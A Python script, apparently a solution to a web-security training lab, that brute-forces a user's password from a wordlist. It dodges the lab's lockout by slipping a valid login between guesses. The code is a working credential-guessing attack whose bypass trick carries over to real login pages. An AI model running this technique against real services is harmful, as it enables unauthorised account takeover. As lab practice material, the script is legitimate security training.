import requests
import re
import os

def check_login(session, domain, username, password):
    credential = {'username': username, 'password': password}
    r = session.post(domain + '/login', data=credential)
    if (username != 'wiener'):
        print('Trying Password: ', password)
    if ('Incorrect password' not in r.text and username != 'wiener'):
        return True
    else:
        return False

def brute(session, domain, username, wordlist):
    with open(wordlist, 'r') as f:
        count = 0
        for password in f.readlines():
            password = password.strip()
            count += 1
            if (count % 3 != 0):
                if (check_login(session, domain, username, password)):
                    print('Found Password: ', password)
                    break
            else:
                count = 1
                check_login(session, domain, 'wiener', 'peter')
                if (check_login(session, domain, username, password)):
                    print('Found Password: ', password)
                    break
                
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        path = os.path.dirname(os.path.abspath(__file__))
        print(path)
        brute(session, domain, 'carlos', os.path.join(path, 'passwordlist.txt'))
        verify(session, domain)
    except requests.exceptions.ConnectionError:
        print('Connection Error. Please check your network connection.')
    except:
        print('Something went wrong. Please try again.')